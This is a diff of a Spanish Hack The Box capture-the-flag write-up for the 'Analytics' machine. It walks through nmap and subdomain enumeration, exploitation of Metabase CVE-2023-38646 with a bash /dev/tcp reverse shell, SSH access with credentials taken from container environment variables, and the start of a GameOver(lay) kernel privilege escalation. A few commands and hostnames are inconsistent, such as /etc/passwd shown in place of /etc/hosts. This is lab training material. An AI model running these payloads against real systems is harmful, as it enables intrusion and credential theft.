@@ -15,15 +15,17 @@ layout:
 
 # Analytics
 
+`Analytics` es una máquina Linux de dificultad fácil con servicios HTTP y SSH expuestos. La enumeración del sitio web revela una instancia de `Metabase`, que es vulnerable a la ejecución remota de código de autenticación previa (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), que se aprovecha para obtener un punto de apoyo dentro de un contenedor Docker.
 
+Al enumerar el contenedor Docker, vemos que las variables de entorno establecidas contienen credenciales que se pueden usar para acceder al host mediante SSH. La enumeración posterior a la explotación revela que la versión del kernel que se ejecuta en el host es vulnerable a `GameOverlay`, que se aprovecha para obtener privilegios de `root`.
 
+<figure><img src="../../.gitbook/assets/Analytics.png" alt="" width="563"><figcaption></figcaption></figure>
 
-
-
+***
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Analytics**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.233 -oG allPorts
@@ -45,9 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
            Raw packets sent: 66091 (2.908MB) | Rcvd: 66109 (2.645MB)
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentra expuesta una página web de **Nginx**.
 
 ```bash
 ❯ nmap -sCV -p80 10.10.11.233 -A -oN targeted -oX targetedXMl
@@ -89,36 +89,33 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/4508_vmware_iXBPZRIIVq.png" alt=""><figcaption></figcaption></figure>
 
+Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada.
 
+```bash
+❯ cat /etc/passwd | grep 10.10.11.233
+10.10.11.233 analytical.htb
+```
 
 ## Web Enumeration
 
-
+Accederemos a [http://analytical.htb](http://analytical.htb) y verificaremos que se trata de una página web en la cual no nos muestra gran información.
 
 <figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
 
-
-
-```bash
-❯ whatweb http://analytical.htb/
-http://analytical.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]
-```
-
-
-
-
+Realizaremos una enumeración de directorios y páginas del sitio web, no logramos obtener ninguna información a través de la herramienta de `dirsearch`.
 
 ```bash
 ❯ dirsearch -u 'http://analytical.htb' -i 200 -t 50 2>/dev/null
@@ -137,13 +134,9 @@ Target: http://analytical.htb/
 Task Completed
 ```
 
-
-
-
-
 ### Subdomain Enumeration
 
-
+Al realizar una enumeración de subdominios en el sitio web, nos encontramos con un subdominio llamado `data`.
 
 ```bash
 ❯ wfuzz --hh=154 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.analytical.htb" http://analytical.htb 2>/dev/null
@@ -161,31 +154,36 @@ ID           Response   Lines    Word       Chars       Payload
 000005043:   200        27 L     3538 W     77677 Ch    "Data"   
 ```
 
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
+```bash
+❯ cat /etc/passwd | grep 10.10.11.233
+10.10.11.233 analytical.htb
+```
 
-
-
-<figure><img src="../../.gitbook/assets/4510_vmware_zkBMp1DFBA.png" alt=""><figcaption></figcaption></figure>
-
-
-
-## Initial Foothold
-
-
-
-### Metabase Exploitation - PreAuth Remote Code Execution \[RCE] (CVE-2023-38646)
-
-
+Accederemos a http://data.metabase.htb y verificamos que se trata de un panel de incio de sesión de `Metabase`.
 
 {% hint style="info" %}
 MetaBase es una plataforma que permite analizar el contenido de los archivos históricos (Log Files) generados por el sistema Proxy y las plataformas de gestión como Dspace, Open Journal System y Koha de las unidades de información.
 {% endhint %}
 
+<figure><img src="../../.gitbook/assets/4510_vmware_zkBMp1DFBA.png" alt=""><figcaption></figcaption></figure>
 
+## Initial Foothold
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+### Metabase Exploitation - PreAuth Remote Code Execution \[RCE] (CVE-2023-38646)
 
+Buscando posibles vulnerabilidades sobre `Metabase`, nos encontramos con el siguiente `CVE-2023-38646`.
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-38646" %}
+
+{% hint style="danger" %}
+Las versiones de código abierto de Metabase anteriores a la 0.46.6.1 y Metabase Enterprise anteriores a la 1.46.6.1 permiten a los atacantes ejecutar comandos arbitrarios en el servidor, en el nivel de privilegio del servidor. No se requiere autenticación para la explotación. Las otras versiones corregidas son 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2 y 1.43.7.2.
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+
+Nos encontramos con el siguiente repositorio con un PoC del exploit. Nos lo descargaremos el repositorio en nuestro equipo y visualizaremos el funcionamiento del exploit `main.py`.
 
 {% embed url="https://github.com/m3m0o/metabase-pre-auth-rce-poc" %}
 
@@ -211,21 +209,21 @@ options:
                         Command to be execute in the target host
 ```
 
-
+En el PoC se nos requiere el `setup-token` del `Metabase`, el cual podemos localizar a través del siguiente comando.
 
 ```bash
 ❯ curl -s -X GET 'http://data.analytical.htb/api/session/properties' | jq | grep -i 'setup-token' | tr -d '":,'
   setup-token 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
 ```
 
-
+Por otro lado, nos pondremos en escucha por un puerto para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el exploit para enviarnos una Reverse Shell hacia nuestro equipo.
 
 ```bash
 ❯ python3 main.py -u http://data.analytical.htb -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"
@@ -237,7 +235,7 @@ listening on [any] 443 ...
 [+] Payload sent
 ```
 
-
+Verificaremos que hemos ganado acceso al sistema, pero al parecer se trata de un Docker y no nos encontramos aún en el equipo principal.
 
 ```bash
 ❯ nc -nlvp 443
@@ -258,25 +256,11 @@ ip a
        valid_lft forever preferred_lft forever
 ```
 
-
-
-
-
 ## Initial Access
-
-
-
-```bash
-47200cf3578f:/$ id      
-id
-uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
-```
-
-
 
 ### Docker Container Information Leakage
 
-
+Al revisar las variables que tenía dispone el usuario, nos encontramos con unas credenciales del acceso a `Metabase` del usuario `metalytics`.
 
 ```bash
 47200cf3578f:/$ env
@@ -311,7 +295,7 @@ JAVA_VERSION=jdk-11.0.19+7
 _=/usr/bin/env
 ```
 
-
+Probaremos de acceder mediante SSH a través del usuario `metalytics` para verificar si podemos acceder con las credenciales obtenidas. Logramos el acceso y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh metalytics@analytical.htb
@@ -323,22 +307,18 @@ metalytics@analytics:~$ cat user.txt
 11dab8814d**********************
 ```
 
-
-
-
-
 ## Privilege Escalation
 
-
-
 ### Kernel Exploitation - GameOver(lay)
+
+Revisamos la versión del Kernel en busca de vulnerabilidades a través de la versión de Kernel.
 
 ```bash
 metalytics@analytics:~$ uname -a
 Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-
+Nos encontramos con el siguiente repositorio en el cual nos mencionan que la versión que dispone el equipo probablemente sea vulnerable a `GameOver(lay)`.
 
 
 
